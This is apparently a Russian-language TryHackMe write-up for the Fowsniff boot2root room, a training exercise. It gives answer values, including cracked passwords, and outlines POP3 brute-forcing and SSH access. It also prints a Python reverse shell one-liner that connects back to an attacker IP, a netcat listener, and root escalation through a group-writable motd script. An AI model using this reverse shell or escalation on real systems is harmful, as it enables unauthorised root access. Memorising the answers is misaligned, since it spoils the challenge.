[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Fowsniff CTF](https://tryhackme.com/r/room/ctf) 

Всего 1 заданиe:
## Задание 1
Эта машина boot2root великолепна для новичков. Вам придется перечислить эту машину, найдя открытые порты, провести некоторые онлайн-исследования (удивительно, сколько информации может найти для вас Google), расшифровать хэши, перебрать вход в систему pop3 и многое другое!

Это будет структурировано, чтобы пройти через то, что вам нужно сделать, шаг за шагом. Убедитесь, что вы подключены к нашей сети

Спасибо berzerk0  за создание этой машины. Эта машина используется здесь с явного разрешения создателя <3 

### Ответьте на вопросы ниже
Разверните машину. В правом верхнем углу вы увидите кнопку «Развернуть» . Нажмите на нее, чтобы развернуть машину в облаке. Подождите минуту, пока она не станет активной.
```commandline
Ответ не нужен
```
Используя nmap, просканируйте эту машину. Какие порты открыты?
```commandline
Ответ не нужен
```
Используя информацию из открытых портов. Осмотритесь. Что вы можете найти?
```commandline
Ответ не нужен
```
Можете ли вы с помощью Google найти какую-либо публичную информацию о них?
```commandline
Ответ не нужен
```
Можете ли вы расшифровать эти md5 хеши? Вы даже можете использовать сайты типа hashkiller , чтобы расшифровать их.
```commandline
Ответ не нужен
```
Используя полученные вами имена пользователей и пароли, можете ли вы применить Metasploit для взлома пароля pop3?
```commandline
Ответ не нужен
```
Какой пароль у seina для доступа к почтовому сервису?


```commandline
scoobydoo2
```
Можете ли вы подключиться к службе pop3 с ее учетными данными? Какую информацию об электронной почте вы можете собрать?
```commandline
Ответ не нужен
```
Просматривая ее электронную почту, какой временный пароль был установлен для нее?


```commandline
S1ck3nBluff+secureshell
```
В электронном письме, кто его отправил? Используя пароль из предыдущего вопроса и имя пользователя отправителя, подключитесь к машине с помощью SSH.
```commandline
Ответ не нужен
```
После подключения, к каким группам принадлежит этот пользователь? Есть ли какие-нибудь интересные файлы, которые может запустить эта группа?
```commandline
Ответ не нужен
```
Теперь, когда вы нашли файл, который может редактировать группа, можете ли вы отредактировать его, включив в него обратную оболочку?

Обратная оболочка Python:

python3 -c 'импорт сокета, подпроцесса, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((<IP>,1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

Другие обратные оболочки: здесь .
```commandline
Ответ не нужен
```
Если вы еще не узнали, этот файл запускается как root, когда пользователь подключается к машине с помощью SSH. Мы знаем это, поскольку при первом подключении мы видим, что нам выдается баннер (с fowsniff corp). Посмотрите в  файле /etc/update-motd.d/ . Если (после того, как мы поместили нашу обратную оболочку в файл cube) мы затем включим этот файл в файл motd.d, он запустится как root, и мы получим обратную оболочку как root!
```commandline
Ответ не нужен
```
Запустите прослушиватель netcat (nc -lvp 1234) и затем повторно войдите в службу SSH. Затем вы получите обратную оболочку в вашем сеансе netcat как root!
```commandline
Ответ не нужен
```
Если вы действительно застряли, вот блестящее пошаговое руководство:  https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

Если вам так проще, следуйте этому пошаговому руководству, разместив машину на объекте.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)